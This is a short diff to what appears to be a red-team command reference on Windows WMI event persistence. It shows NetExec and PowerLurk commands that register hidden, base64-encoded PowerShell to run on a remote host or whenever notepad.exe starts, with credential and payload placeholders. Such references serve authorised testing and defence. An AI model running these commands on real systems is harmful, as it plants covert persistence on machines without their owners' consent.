@@ -19,5 +19,5 @@ runs as SYSTEM, and touches no Run key or scheduled task. PowerLurk's
 
 ```sh
 nxc smb {{rhost}} -u {{user}} -p {{password}} -M wmi-event -o CONSUMER='powershell -w hidden -enc <b64>'
-Register-WmiEvent -Query "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'" -Action {iex(<payload>)}
+Register-MaliciousWmiEvent -EventName Persist -PermanentCommand "powershell -w hidden -enc <b64>" -Trigger ProcessStart -ProcessName notepad.exe
 ```
